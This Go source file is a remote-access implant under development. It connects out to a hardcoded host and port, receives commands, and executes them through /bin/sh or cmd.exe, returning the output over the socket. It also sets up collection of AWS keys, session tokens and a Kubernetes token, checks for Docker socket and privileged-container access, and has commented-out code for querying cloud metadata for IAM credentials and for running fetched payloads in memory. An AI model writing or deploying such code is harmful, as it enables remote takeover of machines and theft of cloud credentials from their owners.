package main

import (
    "fmt"
    "net"
    "os/exec"
    "os/user"
    "io"
    _ "io/ioutil"
    "bufio"
    "strings"
    "encoding/json"
    _ "net/http"
    "log"
    "runtime"
    _ "syscall"
    "reflect"
)



var HOST = "127.0.0.1"
var PORT = "443"




type uname struct {
    arch string `json:arch`
    version string `json:version`
    release string `json:release`
}

type aws_creds struct {
    profile string `json:profile`
    AWS_KEY string `json:AWS_KEY`
    SECRET_KEY string `json:SECRET_KEY`
    SESSION_TOKEN string `json:SESSION_TOKEN`
    region string `json:region`
}

type check_env struct {
    SYSTEM string `json:SYSTEM`
    USER string `json:USER`
    UNAME uname `json:UNAME`
    HOSTNAME string `json:HOSTNAME`
    INIT string `json:INIT`
    DOCKSOCK bool `json:DOCKSOCK`
    PRIVILEGED bool `json:PRIVILEGED`
    DISKS []string `json:DISKS`
    KUBETOKEN string `json:KUBETOKEN`
    AWS_CREDS aws_creds `json:AWS_CREDS`
}

func init_info(system string){
    if system == "linux"{
        uname_map :=  uname{
            arch:   "",
            version:"",
            release:"",
        }

        aws_creds_map := aws_creds{
            profile:        "",
            AWS_KEY:        "",
            SECRET_KEY:     "",
            SESSION_TOKEN:  "",
            region:         "",
        }

        //var disks [100]string
        var disks []string

        check_env_map := &check_env{
            SYSTEM:     "",
            USER:       "",
            UNAME:      uname_map,
            HOSTNAME:   "",
            INIT:       "",
            DOCKSOCK:   false,
            PRIVILEGED: false,
            DISKS:      disks,
            KUBETOKEN:  "",
            AWS_CREDS:  aws_creds_map,
        }


        //ENV struct `json:ENV` {}
        /*uname := map[string]string{
            arch string `json:arch`
            version string `json:version`
            release string `json:release`
        }*/

        check_env_map.SYSTEM = system

        //---------------------------
        //Username
        user, err := user.Current()
        if err != nil {
            log.Fatalf(err.Error())
        }

        username := user.Username
        check_env_map.USER = username

        /*
        //---------------------------
        utsname := &syscall.Utsname{}
        //uname := charsToString(utsname.Machine)
        uname := utsname.Machine
        fmt.Println(uname)
        */

        json_check_env, err := json.Marshal(check_env_map)
        fmt.Println(reflect.TypeOf(string(json_check_env)))
        fmt.Println(fmt.Sprintf("%sdone",string(json_check_env)))
        //return json_check_env
    }else if system == "windows"{

        uname_map :=  uname{
            arch:   "",
            version:"",
            release:"",
        }

        aws_creds_map := aws_creds{
            profile:        "",
            AWS_KEY:        "",
            SECRET_KEY:     "",
            SESSION_TOKEN:  "",
            region:         "",
        }

        //var disks [100]string
        var disks []string

        check_env_map := &check_env{
            SYSTEM:     "",
            USER:       "",
            UNAME:      uname_map,
            HOSTNAME:   "",
            INIT:       "",
            DOCKSOCK:   false,
            PRIVILEGED: false,
            DISKS:      disks,
            KUBETOKEN:  "",
            AWS_CREDS:  aws_creds_map,
        }


        //ENV struct `json:ENV` {}
        /*uname := map[string]string{
            arch string `json:arch`
            version string `json:version`
            release string `json:release`
        }*/

        check_env_map.SYSTEM = system

        //---------------------------
        //Username
        user, err := user.Current()
        if err != nil {
            log.Fatalf(err.Error())
        }

        username := user.Username
        check_env_map.USER = username

        /*
        //---------------------------
        utsname := &syscall.Utsname{}
        //uname := charsToString(utsname.Machine)
        uname := utsname.Machine
        fmt.Println(uname)
        */

        json_check_env, err := json.Marshal(check_env_map)
        fmt.Println(reflect.TypeOf(string(json_check_env)))
        fmt.Println(fmt.Sprintf("%sdone",string(json_check_env)))
        //return json_check_env
    }
}

func check_env_function(system string){
    json_array := `{"species":"pigeon", "decription": "likes to perch on rocks"}`
    fmt.Println(reflect.TypeOf(json_array))
    if string(json_array[0]) == "["{
        m := []map[string]string{}
        err := json.Unmarshal([]byte(json_array), &m)
        if err != nil {
            fmt.Println(err)
        }
        for _, result := range m{
            fmt.Println(result["species"])
        }
    }else{
        m := map[string]string{}
        err := json.Unmarshal([]byte(json_array), &m)
        if err != nil {
            fmt.Println(err)
        }

        fmt.Println(m["species"])
    }
}

/*
func meta_data(){
    metadata := map[string]string {}

    metatest := map[string]string {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest := map[string]string {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest := map[string]string {
        "macs": "network/interfaces/macs",
    }

    interfaces := map[string]string {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-id": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    var metalink = "http://169.254.169.254"

    for key, element := range interfaces{
        link := fmt.Sprintf("%s/%s", metalink, element)
        fmt.Println(link)
        resp, err := http.Get(link)
        //http.Get(metalink + "/" + element)

        if err != nil {
		    log.Fatal(err)
	    }

        defer resp.Body.Close()
        body, err := ioutil.ReadAll(resp.Body)
        //fmt.Sprintf("%s", string(body))
        if err != nil {
            log.Fatal(err)
        }
        bodyString := string(body)
        response_body := fmt.Sprintf("%s: %s", key, bodyString)
        fmt.Println(response_body)
    }
}
*/

func main() {
    sock := fmt.Sprintf("%s:%s", HOST, PORT)
    fmt.Println(sock)
    var system = runtime.GOOS
    fmt.Println(system)
    conn, err := net.Dial("tcp", sock)
    if err == nil {
        fmt.Println("Connection successful")
    }

    for {
        msg, _ := bufio.NewReader(conn).ReadString('\n')
        comm := strings.TrimSpace(string(msg))

        fmt.Println(msg)
        fmt.Println(comm)

        if comm == "exit" || comm == "quit"{
            fmt.Println("TCP client exiting...")
            conn.Close()
            return

        /*}else if comm == "run_in_memory"{
            var n = 2
            b := make([]byte, n)
            for i := range b {
                b[i] = letterBytes[rand.Intn(len(letterBytes))]
            }

            Data, err := getURLContent(path)

            mfd, err := memfd.Create()
            mfd.Write(Data)
            filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())
            cmd := exec.Command(filePath)
            out, err := cmd.Run()
        */
        }else if comm == "check_env"{
            if runtime.GOOS == "windows" {
                fmt.Println("Hello from Windows")
            }else{
                init_info(system)

            }
            if _, err := conn.Write([]byte("Check_Env")); err != nil {
					conn.Close()
				}
        }else{
            fmt.Println("Executing Command...")
            var cmd *exec.Cmd

            if runtime.GOOS == "linux" {
                command := strings.NewReader(comm)
                cmd = exec.Command("/bin/sh", "-i")
                rp, wp := io.Pipe()
                //cmd.Stdin, _ = bufio.NewReader(conn).ReadString('\n')
                cmd.Stdin = command
                cmd.Stdout = wp
                go io.Copy(conn, rp)

                if err := cmd.Run(); err != nil {
                    fmt.Println("Error: ", err)
                }
            }else if runtime.GOOS == "windows" {
                fmt.Println("Windows Part")
                //cmd := exec.Command("cmd.exe", string(comm))
                cmd = exec.Command("cmd.exe", "/C", msg)
                //cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                out, _ := cmd.Output()
                conn.Write([]byte(out))
            }
        }
    }
}
